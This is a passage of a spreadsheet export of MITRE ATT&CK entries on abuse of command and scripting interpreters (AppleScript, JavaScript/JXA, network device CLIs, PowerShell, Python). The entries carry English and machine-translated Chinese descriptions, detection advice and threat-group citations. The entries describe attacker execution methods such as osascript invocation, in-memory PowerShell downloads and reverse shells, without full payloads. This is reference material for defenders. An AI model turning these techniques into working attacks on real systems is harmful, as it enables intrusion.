Github),(Citation: GDATA Zeus Panda June 2017),(Citation: Proofpoint TA505 October 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: Crowdstrike DNC June 2016),(Citation: Flashpoint FIN 7 March 2019),(Citation: ClearSky Pay2Kitten December 2020),(Citation: Unit42 OilRig Nov 2018),(Citation: OilRig ISMAgent July 2017),(Citation: Talos PoetRAT October 2020),(Citation: FireEye FIN6 April 2016),(Citation: NCC Group APT15 Alive and Strong),(Citation: Cybereason Cobalt Kitty 2017),(Citation: US-CERT TA18-074A),(Citation: ESET ForSSHe December 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: ANSSI Sandworm January 2021),(Citation: FireEye APT34 Dec 2017),(Citation: FireEye APT37 Feb 2018),(Citation: NCC Group Fivehands June 2021),(Citation: Netspi PowerShell Execution Policy Bypass),(Citation: win10_asr)",命令和脚本解释器/命令和脚本解析器,攻击者可能滥用命令和脚本解释器来执行命令、脚本或二进制文件。这些接口和语言提供了与计算机系统交互的方式，并且是许多不同平台的共同特征。大多数系统都带有一些内置的命令行界面和脚本功能，例如，macOS 和 Linux 发行版包含一些 [Unix Shell](https://attack.mitre.org/techniques/T1059/004)，而 Windows安装包括 [Windows 命令外壳](https://attack.mitre.org/techniques/T1059/003) 和 [PowerShell](https://attack.mitre.org/techniques/T1059/001)。还有跨平台的解释器如[Python](https://attack.mitre.org/techniques/T1059/006)，以及那些通常与客户端应用程序相关的如[JavaScript](https://attack .mitre.org/techniques/T1059/007) 和 [Visual Basic](https://attack.mitre.org/techniques/T1059/005)。攻击者可能以各种方式滥用这些技术作为执行任意命令的手段。命令和脚本可以嵌入到 [Initial Access](https://attack.mitre.org/tactics/TA0001) 有效载荷中，作为诱饵文档或从现有 C2 下载的辅助有效载荷传递给受害者。攻击者也可以通过交互式终端/shell执行命令，以及利用各种[远程服务]（https://attack.mitre.org/techniques/T1021）来实现远程执行。（引用：Powershell远程命令）（引文：Cisco IOS 软件完整性保证 - 命令历史）（引文：Python 中的远程 Shell 执行）
T1059.002,Command and Scripting Interpreter: AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)

AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)",https://attack.mitre.org/techniques/T1059/002,09 March 2020,19 October 2022,1.1,Execution,"Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",macOS,"Command: Command Execution, Process: OS API Execution, Process: Process Creation",True,T1059,,"Phil Stokes, SentinelOne",,0.0,,,,,"(Citation: objsee mac malware 2017),(Citation: MacKeeper Bundlore Apr 2019),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: wardle evilquest parti),(Citation: applescript signing)",命令和脚本解释器/命令和脚本解析器：AppleScript,"攻击者可能会滥用 AppleScript 来执行。 AppleScript 是一种 macOS 脚本语言，旨在通过称为 AppleEvents 的应用程序间消息来控制应用程序和操作系统的某些部分。（引用：Apple AppleScript）这些 AppleEvent 消息可以单独发送或使用 AppleScript 轻松编写脚本。这些事件可以定位打开的窗口，发送击键，并与几乎任何本地或远程打开的应用程序进行交互。脚本可以通过 <code>osascript /path/to/script</code> 或 <code>osascript -e ""script here""</code> 从命令行运行。除了命令行，脚本还可以通过多种方式执行，包括邮件规则、Calendar.app 警报和 Automator 工作流程。 AppleScripts 也可以通过将 <code>#!/usr/bin/osascript</code> 添加到脚本文件的开头来作为纯文本 shell 脚本执行。（引用：SentinelOne AppleScript）AppleScripts 不需要调用 <code> osascript</code> 来执行。但是，它们可以通过使用 macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> 或 <code>OSAScript< 从 mach-O 二进制文件中执行/code>，两者都执行独立于 <code>/usr/bin/osascript</code> 命令行实用程序的代码。攻击者可能会滥用 AppleScript 来执行各种行为，例如与开放的 SSH 连接进行交互、移动到远程机器，甚至向用户展示虚假对话框。这些事件不能远程启动应用程序（它们可以在本地启动它们），但如果它们已经在远程运行，它们可以与应用程序交互。在 macOS 10.10 Yosemite 及更高版本上，AppleScript 能够执行 [Native API](https://attack.mitre.org/techniques/T1106)，否则需要以 mach-O 二进制文件格式编译和执行。 （引用：SentinelOne macOS Red Team）由于这是一种脚本语言，它还可以用于启动更常见的技术，例如通过 [Python] 的反向 shell（https://attack.mitre.org/techniques/T1059/ 006).（引文：宏恶意软件针对 Mac）"
T1059.007,Command and Scripting Interpreter: JavaScript,"Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)

JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)

JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)

Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",https://attack.mitre.org/techniques/T1059/007,23 June 2020,16 August 2021,2.1,Execution,"Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.

Monitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.

Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.","Linux, Windows, macOS","Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1059,,"Cody Thomas, SpecterOps","Administrator, SYSTEM, User",,,,,,"(Citation: fsecure NanHaiShu July 2016),(Citation: Morphisec Cobalt Gang Oct 2018),(Citation: Cybereason Valak May 2020),(Citation: Zscaler Higaisa 2020),(Citation: Kaspersky Adwind Feb 2016),(Citation: Group IB Cobalt Aug 2017),(Citation: Malwarebytes Higaisa 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: PTSecurity Higaisa 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: ATT Sidewinder January 2021),(Citation: Cofense Astaroth Sept 2018),(Citation: CISA AA20-301A Kimsuky),(Citation: Volexity Ocean Lotus November 2020),(Citation: Hornet Security Avaddon June 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: ESET InvisiMole June 2020),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Kaspersky QakBot September 2021),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Donut Github),(Citation: FireEye MuddyWater Mar 2018),(Citation: Talos Cobalt Group July 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Kaspersky MoleRATs April 2019),(Citation: Trend Micro FIN6 October 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: ESET EvilNum July 2020),(Citation: Flashpoint FIN 7 March 2019),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: SecureList Griffon May 2019),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Awake Security Avaddon),(Citation: Symantec WastedLocker June 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Leafminer July 2018),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: Unit42 Xbash Sept 2018),(Citation: FireEye FIN7 Aug 2018),(Citation: Proofpoint TA505 June 2018),(Citation: Prevailion DarkWatchman 2021),(Citation: Malwarebytes Konni Aug 2021),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Cylance Dust Storm),(Citation: DFIR Conti Bazar Nov 2021),(Citation: win10_asr)",命令和脚本解释器/命令和脚本解析器：JavaScript,攻击者可能会滥用 JavaScript 的各种实现来执行。 JavaScript (JS) 是一种独立于平台的脚本语言（在运行时即时编译），通常与网页中的脚本相关联，尽管 JS 可以在浏览器之外的运行时环境中执行。（引用：NodeJS）JScript 是 Microsoft 实现相同的脚本标准。 JScript 通过 Windows 脚本引擎进行解释，因此与 Windows 的许多组件集成，例如 [组件对象模型](https://attack.mitre.org/techniques/T1559/001) 和 Internet Explorer HTML 应用程序 (HTA) 页面.（引用：JScrip 2018 年 5 月）（引用：Microsoft JScript 2007）（引用：Microsoft Windows 脚本）用于自动化的 JavaScript (JXA) 是一种基于 JavaScript 的 macOS 脚本语言，包含在 Apple 的开放脚本架构 (OSA) 中，在 OSX 10.10 中引入。 Apple 的 OSA 提供脚本功能来控制应用程序、与操作系统交互以及桥接对 Apple 其他内部 API 的访问。从 OSX 10.10 开始，OSA 仅支持两种语言，JXA 和 [AppleScript](https://attack.mitre.org/techniques/T1059/002)。脚本可以通过命令行实用程序<code>osascript</code>执行，也可以通过<code>osacompile</code>编译成应用程序或脚本文件，也可以在其他程序的内存中编译执行利用 OSAKit 框架。（引用：Apple About Mac Scripting 2016）（引用：SpecterOps JXA 2020）（引用：SentinelOne macOS Red Team）（引用：Red Canary Silver Sparrow Feb2021）（引用：MDSec macOS JXA 和 VSCode）对手可能滥用JavaScript 的各种实现来执行各种行为。常见用途包括在网站上托管恶意脚本作为 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) 的一部分，或下载和执行这些脚本文件作为辅助有效负载。由于这些有效负载是基于文本的，因此攻击者将其内容混淆为 [混淆文件或信息] (https://attack.mitre.org/techniques/T1027) 的一部分也很常见。
T1059.008,Command and Scripting Interpreter: Network Device CLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. 

Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).

Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)",https://attack.mitre.org/techniques/T1059/008,20 October 2020,19 April 2022,1.1,Execution,"Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.(Citation: Cisco IOS Software Integrity Assurance - Command History)

Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.",Network,Command: Command Execution,True,T1059,,,,1.0,,,,,",(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",命令和脚本解释器/命令和脚本解析器：网络设备 CLI,攻击者可能会滥用网络设备上的脚本或内置命令行解释器 (CLI) 来执行恶意命令和有效负载。 CLI 是用户和管理员与设备交互以查看系统信息、修改设备操作或执行诊断和管理功能的主要方式。 CLI 通常包含不同命令所需的各种权限级别。脚本解释器自动执行任务并将功能扩展到网络操作系统中包含的命令集之外。 CLI 和脚本解释器可通过直接控制台连接或远程方式访问，例如 telnet 或 [SSH](https://attack.mitre.org/techniques/T1021/004)。攻击者可以使用网络 CLI 来更改网络设备的行为和操作方式。 CLI 可用于操纵流量以拦截或操纵数据，修改启动配置参数以加载恶意系统软件，或禁用安全功能或日志记录以避免检测。（引用：Cisco Synful Knock Evolution）
T1059.001,Command and Scripting Interpreter: PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",https://attack.mitre.org/techniques/T1059/001,09 March 2020,19 April 2022,1.2,Execution,"If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.

Monitor for loading and/or execution of artifacts associated with PowerShell specific assemblies, such as System.Management.Automation.dll (especially to unusual process names/locations).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)

It is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution (which is applied to .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.(Citation: FireEye PowerShell Logging 2016) An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.

Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the <code>EngineVersion</code> field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the <code>HostName</code> field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Process: Process Metadata, Script: Script Execution",True,T1059,,"Mayuresh Dani, Qualys; Praetorian",,1.0,,,,,"(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Cyberreason Anchor December 2019),(Citation: FireEye APT32 May 2017),(Citation: FireEye Obfuscation June 2017),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: Cybereason Valak May 2020),(Citation: Volexity SolarWinds),(Citation: Symantec Cicada November 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Kaspersky Lyceum October 2021),(Citation: EST Kimsuky April 2019),(Citation: FoxIT Wocao December 2019),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: CME Github September 2018),(Citation: RATANKBA),(Citation: CISA AA20-301A Kimsuky),(Citation: Secureworks GandCrab and REvil September 2019),(Citation: ClearSky Wilted Tulip July 2017),(Citation: Unit 42 Inception November 2018),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: TrendMicro MacOS April 2018),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: GitHub PowerSploit May 2012),(Citation: Talos Promethium June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: OilRig New Delivery Oct 2017),(Citation: Group IB Ransomware September 2020),(Citation: Symantec Waterbug Jun 2019),(Citation: Symantec Dragonfly Sept 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: TrendMicro Netwalker May 2020),(Citation: FireEye APT33 Guardrail),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Symantec Seaduke 2015),(Citation: Carbon Black JCry May 2019),(Citation: Unit 42 DarkHydrus July 2018),(Citation: Talos Lokibot Jan 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: MuddyWater TrendMicro June 2018),(Citation: FireEye FIN6 April 2016),(Citation: KISA Operation Muzabi),(Citation: Trend Micro DRBControl February 2020),(Citation: Intel 471 REvil March 2020),(Citation: Proofpoint TA459 April 2017),(Citation: Deep Instinct TA505 Apr 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Talos Sodinokibi April 2019),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit42 Xbash Sept 2018),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: FireEye APT34 Dec 2017),(Citation: Forcepoint Monsoon),(Citation: Prevailion DarkWatchman 2021),(Citation: NCSC Joint Report Public Tools),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Symantec Emotet Jul 2018),(Citation: Symantec MuddyWater Dec 2018),(Citation: Carbon Black Emotet Apr 2019),(Citation: Trustwave Pillowmint June 2020),(Citation: Reaqta MuddyWater November 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: SecureWorks August 2019),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: McAfee Cuba April 2021),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Symantec Thrip June 2018),(Citation: Github PowerShell Empire),(Citation: Cisco DNSMessenger March 2017),(Citation: FBI Flash FIN7 USB),(Citation: Cybereason PowerLess February 2022),(Citation: FireEye FIN10 June 2017),(Citation: CrowdStrike BloodHound April 2018),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: Unit 42 Playbook Dec 2017),(Citation: Cisco Ukraine Wipers January 2022),(Citation: PTSecurity Cobalt Dec 2016),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Morphisec FIN7 June 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Cybereason Oceanlotus May 2017),(Citation: Google TAG Lazarus Jan 2021),(Citation: FireEye APT19),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye Periscope March 2018),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Donut Github),(Citation: FireEye POSHSPY April 2017),(Citation: CobaltStrike Daddy May 2017),(Citation: Bromium Ursnif Mar 2017),(Citation: Kaspersky APT Trends Q1 April 2021),(Citation: Red Canary Emotet Feb 2019),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: Accenture MUDCARP March 2019),(Citation: Cymmetria Patchwork),(Citation: Kaspersky Poseidon Group),(Citation: AADInternals Documentation),(Citation: BiZone Lizar May 2021),(Citation: ESET Exchange Mar 2021),(Citation: Flashpoint FIN 7 March 2019),(Citation: CrowdStrike Grim Spider May 2019),(Citation: SecureList Griffon May 2019),(Citation: PowerSploit Documentation),(Citation: CERT-FR PYSA April 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Symantec Chafer February 2018),(Citation: US-CERT TA18-074A),(Citation: Talos Konni May 2017),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: RiskIQ Cobalt Jan 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: ESET T3 Threat Report 2021),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: Malwarebytes Konni Aug 2021),(Citation: FireEye TEMP.Veles 2018),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Microsoft Actinium February 2022),(Citation: BleepingComputer Molerats Dec 2020),(Citation: Morphisec ShellTea June 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Talos MuddyWater May 2019),(Citation: CISA ComRAT Oct 2020),(Citation: FireEye FIN6 Apr 2019),(Citation: Crowdstrike Indrik November 2018),(Citation: Cycraft Chimera April 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: PWC WellMess July 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Symantec Elfin Mar 2019),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Check Point Warzone Feb 2020),(Citation: Crowdstrike Helix Kitten Nov 2018),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Symantec Gallmaker Oct 2018),(Citation: NCC Group Team9 June 2020),(Citation: GitHub Pupy),(Citation: Securelist MuddyWater Oct 2018),(Citation: ATT Sidewinder January 2021),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Unit 42 WhisperGate January 2022),(Citation: BitDefender Chafer May 2020),(Citation: FireEye NETWIRE March 2019),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Cybereason Soft Cell June 2019),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cobalt Strike TTPs Dec 2017),(Citation: Trend Micro njRAT 2018),(Citation: Proofpoint TA505 Sep 2017),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FireEye APT35 2018),(Citation: Kaspersky MoleRATs April 2019),(Citation: Group IB Silence Sept 2018),(Citation: Microsoft Holmium June 2020),(Citation: Intrinsec Egregor Nov 2020),(Citation: Trend Micro Emotet Jan 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: Talos Zeus Panda Nov 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Microsoft HAFNIUM March 2020),(Citation: FireEye APT29 Nov 2018),(Citation: Korean FSI TA505 2020),(Citation: Visa FIN6 Feb 2019),(Citation: FireEye Hancitor),(Citation: ESET Dukes October 2019),(Citation: Cofense RevengeRAT Feb 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye APT41 March 2020),(Citation: Symantec WastedLocker June 2020),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Trend Micro TA505 June 2019),(Citation: Cybereason TA505 April 2019),(Citation: FireEye FIN7 March 2017),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Picus Emotet Dec 2018),(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Alperovitch 2014),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Lab52 WIRTE Apr 2019),(Citation: PWC KeyBoys Feb 2017),(Citation: Lazarus RATANKBA),(Citation: Talos Frankenstein June 2019),(Citation: RedCanary Mockingbird May 2020),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Group IB Ransomware May 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Palo Alto OilRig Sep 2018),(Citation: Talos MuddyWater Jan 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Microsoft POLONIUM June 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: FireEye FIN7 April 2017),(Citation: Kaspersky WIRTE November 2021),(Citation: FireEye APT41 Aug 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: Bitdefender FIN8 July 2021),(Citation: Sophos Netwalker May 2020),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Talos Cobalt Group July 2018),(Citation: ClearSky MuddyWater Nov 2018),(Citation: Anomali Static Kitten February 2021),(Citation: ESET Nomadic Octopus 2018),(Citation: cobaltstrike manual),(Citation: Cybereason Molerats Dec 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Red Canary Hospital Thwarted Ryuk October 2020),(Citation: Tetra Defense Sodinokibi March 2020),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Dragos Crashoverride 2018),(Citation: FireEye TRITON 2019),(Citation: FireEye APT29),(Citation: Palo Alto Sofacy 06-2018),(Citation: NCC Group Chimera January 2021),(Citation: Check Point Meteor Aug 2021),(Citation: Medium S2W WhisperGate January 2022),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: CISA WellMess July 2020),(Citation: ESET Turla Mosquito May 2018),(Citation: FireEye Operation Double Tap),(Citation: Netspi PowerShell Execution Policy Bypass)",命令和脚本解释器/命令和脚本解析器：PowerShell,"攻击者可能会滥用 PowerShell 命令和脚本来执行。 PowerShell 是一个强大的交互式命令行界面和包含在 Windows 操作系统中的脚本环境。（引用：TechNet PowerShell） 攻击者可以使用 PowerShell 执行许多操作，包括发现信息和执行代码。示例包括可用于运行可执行文件的 <code>Start-Process</code> cmdlet 和在本地或远程计算机上运行命令的 <code>Invoke-Command</code> cmdlet（尽管管理员权限是需要使用 PowerShell 连接到远程系统）。 PowerShell 还可用于从 Internet 下载和运行可执行文件，这些可执行文件可以从磁盘或内存中执行，而无需接触磁盘。许多基于 PowerShell 的攻击性测试工具可用，包括 [Empire](https://attack.mitre.org/software/S0363)、[PowerSploit](https://attack.mitre.org/software/S0194) , [PoshC2](https://attack.mitre.org/software/S0378), 和 PSAttack。(Citation: Github PSAttack) PowerShell 命令/脚本也可以在不直接调用 <code>powershell.exe</code 的情况下执行> 通过 .NET 框架和 Windows 公共语言接口 (CLI) 公开的 PowerShell 底层 <code>System.Management.Automation</code> 程序集 DLL 的接口的二进制文件。（引用：Sixdub PowerPick Jan 2016）（引用：SilentBreak Offensive PS 2015 年 12 月）（引用：Microsoft PSfromCsharp APR 2014）"
T1059.006,Command and Scripting Interpreter: Python,"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",https://attack.mitre.org/techniques/T1059/006,09 March 2020,26 July 2021,1.0,Execution,"Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

